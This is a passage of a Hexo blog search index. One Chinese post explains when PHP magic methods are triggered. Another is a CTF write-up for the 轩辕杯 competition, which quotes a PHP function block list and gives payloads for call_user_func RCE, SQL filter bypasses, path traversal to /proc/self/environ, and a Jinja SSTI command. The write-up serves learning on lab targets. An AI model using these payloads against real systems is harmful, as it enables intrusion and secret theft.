      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>魔术方法的触发</title>
    <link href="/2025/06/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/"/>
    <url>/2025/06/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="魔术方法的触发条件"><a href="#魔术方法的触发条件" class="headerlink" title="魔术方法的触发条件"></a>魔术方法的触发条件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example1</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup方法被调用\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-string">&quot;初始化数据&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example2</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;1234&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__toString方法被调用\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example3</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct 方法被调用\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example4</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get 方法被调用，属性名：<span class="hljs-subst">$name</span>\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set 方法被调用，属性名：<span class="hljs-subst">$name</span> 值：<span class="hljs-subst">$value</span>\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example5</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__call 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example6</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__callStatic 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example7</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke 方法被调用，参数：<span class="hljs-subst">$arg1</span>, <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example1</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example2</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example3</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example4</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example5</span>();<br><span class="hljs-variable">$f</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example6</span>();<br><span class="hljs-variable">$g</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example7</span>();<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));                     <span class="hljs-comment">//  _wakeup触发条件:unserialize</span><br><span class="hljs-title function_ invoke__">strlen</span>( <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)));            <span class="hljs-comment">// _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));                     <span class="hljs-comment">//_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>-&gt;data;                                  <span class="hljs-comment">//_get触发方法:读取不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$d</span>-&gt;data=<span class="hljs-number">123</span>;                                   <span class="hljs-comment">//_set触发方法：修改不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">i</span>();                                        <span class="hljs-comment">//_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无</span><br><span class="hljs-title class_">Example6</span>::<span class="hljs-title function_ invoke__">i</span>();                                  <span class="hljs-comment">//_callstatic触发方法：静态调用不存在的方法，而不是实例化调用</span><br><span class="hljs-variable">$g</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);                           <span class="hljs-comment">// _invoke触发条件: 对象被当作函数调用，且参数数量多于</span><br>                                                <span class="hljs-comment">//_isset触发条件:对不可访问的属性使用isset()或者empty()函数</span><br>                                                <span class="hljs-comment">//_unset触发条件:对不可访问的属性使用unset()</span><br>                                                <span class="hljs-comment">//_clone触发条件：使用clone函数</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;  _wakeup触发条件:unserialize<br>&#x2F;&#x2F;  _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数<br>&#x2F;&#x2F;_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</p><p>&#x2F;&#x2F;_get触发方法:读取不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_set触发方法：修改不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无<br>&#x2F;&#x2F;_callstatic触发方法：静态调用不存在的方法，而不是实例化调用<br>&#x2F;&#x2F; _invoke触发条件：对象被当作函数调用，且参数数量多于<br>&#x2F;&#x2F;_isset触发条件:对不可访问的属性使用isset()或者empty()函数<br>&#x2F;&#x2F;_unset触发条件:对不可访问的属性使用unset()函数<br>&#x2F;&#x2F;_clone触发条件：使用clone函数</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>轩辕杯</title>
    <link href="/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/"/>
    <url>/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="轩辕杯"><a href="#轩辕杯" class="headerlink" title="轩辕杯"></a>轩辕杯</h3><h2 id="1-ezrce"><a href="#1-ezrce" class="headerlink" title="1.ezrce"></a>1.ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>,<br>        <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<br>        <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>,<br>        <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>,<br>        <span class="hljs-string">&quot;register_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>,<br>        <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,<br>        <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>,<br>        <span class="hljs-string">&quot;file_put_contents&quot;</span>, <span class="hljs-string">&quot;readfile&quot;</span>, <span class="hljs-string">&quot;file_get_contents&quot;</span>, <span class="hljs-string">&quot;highlight_file&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span><br>    );<br><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disable_fun</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;宝宝这对嘛,这不对噢&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$star</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> != <span class="hljs-number">1234</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">1234</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$new</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$star</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$new</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$star</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>思路一:读文件</p><p>能读文件的函数有:<strong>readfile,readgzfile,highlight_file,file_get_content，show_source</strong></p><p><strong>注意var_dump和print_r并不能直接读文件，只能用来打印</strong></p><p>被ban了很多，还剩下readgzfile</p><p>于是构造new&#x3D;readgzfile&amp;star&#x3D;&#x2F;flag</p><p>思路二:rce</p><p>群里大佬的思路</p><p>new&#x3D;\system&amp;star&#x3D;cat &#x2F;flag</p><p>system，passthru</p><p>\system是php全局命名空间</p><h2 id="2-ezsql"><a href="#2-ezsql" class="headerlink" title="2.ezsql"></a>2.ezsql</h2><p>反思:可以先fuzz一下，得知哪些被禁用，然后想到可能可以双写绕过</p><p>思路:</p><p>打开题目,输入1正常查询,输入1 or 1&#x3D;1发现触发waf</p><p>单独输入or和1&#x3D;1发现都没有触发</p><p>说明过滤了空格,采用&#x2F;**&#x2F;绕过</p><p>尝试select发现无结果,并没有waf提示,猜测是被特殊处理,尝试大小写绕过以及双写</p><p>最终发现双写有效</p><h2 id="3-ezweb"><a href="#3-ezweb" class="headerlink" title="3.ezweb"></a>3.ezweb</h2><p>1.非预期</p><p>直接任意文件读取</p><p><img src="/%E5%9B%BE%E7%89%87/20125e48549f69dda75d2a263d99399.png"></p><p>直接读取..&#x2F;..&#x2F;..&#x2F;proc&#x2F;1&#x2F;environ的环境变量</p><p>2.先读取 </p><p>..&#x2F;..&#x2F;..&#x2F;app&#x2F;app.py源码，发现是模板渲染</p><p>..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ的环境变量找到jwt伪造的密钥</p><p>然后条件竞争，上传恶意的index.html渲染到页面实现ssti漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /fllllllaaaggg&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
